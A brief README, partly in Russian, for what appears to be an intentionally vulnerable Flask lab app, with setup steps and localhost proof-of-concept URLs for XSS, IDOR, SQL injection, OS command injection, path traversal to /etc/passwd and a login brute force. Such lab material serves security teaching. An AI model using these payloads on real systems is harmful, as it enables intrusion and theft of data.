### Инструкция по сборке и запуску приложения

pip install flask

Run on kali linux or another linux dist

python3 vulnerable-flask-app.py
...

### Proof of Concept

# xss
http://127.0.0.1:8081/xss?name=<script>alert('xss')</script>

# idor
http://127.0.0.1:8081/users?id=1 

# sqli
http://127.0.0.1:8081/user/' OR 1=1 --

# os command injection
http://127.0.0.1:8081/os_inj?hostname=id

# path traversal
http://127.0.0.1:8081/read_file?filename=/../../../../../../etc/passwd

# brute force
http://127.0.0.1:8081/login?username=admin&password=superadmin
...

### Дополнительные комментарии
> Опциональный раздел

...